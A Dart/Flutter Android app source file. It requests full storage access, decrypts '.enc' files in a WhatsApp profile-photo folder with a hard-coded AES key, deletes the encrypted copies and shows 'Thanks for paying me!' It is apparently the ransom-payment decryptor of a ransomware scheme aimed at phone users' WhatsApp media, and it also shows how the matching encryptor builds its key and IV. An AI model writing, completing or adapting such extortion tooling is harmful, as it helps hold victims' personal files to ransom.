import 'dart:io';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await requestPermissions();
  await decryptAllFilesInFolder();
  runApp(const PlaceholderApp());
}

Future<void> requestPermissions() async {
  var status = await Permission.manageExternalStorage.request();
  if (!status.isGranted) {
    print('Permission not granted!');
  }
}

Future<void> decryptAllFilesInFolder() async {
  final folderPath = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos";
  final password = "Shivam200@123";

  final key = encrypt.Key.fromUtf8(password.padRight(32, '0')); // AES-256
  final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));
  final directory = Directory(folderPath);

  if (!directory.existsSync()) {
    print("Folder does not exist: $folderPath");
    return;
  }

  final files = directory.listSync();

  for (var entity in files) {
    if (entity is File && entity.path.endsWith(".enc")) {
      try {
        final fullData = entity.readAsBytesSync();

        // ✅ First 16 bytes are IV
        final ivBytes = fullData.sublist(0, 16);
        final encryptedBytes = fullData.sublist(16);

        final iv = encrypt.IV(ivBytes);
        final encrypted = encrypt.Encrypted(encryptedBytes);

        final decryptedBytes = encrypter.decryptBytes(encrypted, iv: iv);

        // ✅ Save decrypted file
        final originalPath = entity.path.replaceAll(".enc", "");
        final decryptedFile = File(originalPath);
        decryptedFile.writeAsBytesSync(decryptedBytes);

        print("Decrypted: ${decryptedFile.path}");

        // ✅ Delete encrypted file
        entity.deleteSync();
        print("Deleted encrypted file: ${entity.path}");
      } catch (e) {
        print("Error decrypting file ${entity.path}: $e");
      }
    }
  }
}

class PlaceholderApp extends StatelessWidget {
  const PlaceholderApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: Scaffold(
        body: Center(
          child: Text("Decryption completed now check your phone, Thanks for paying me!"),
        ),
      ),
    );
  }
}
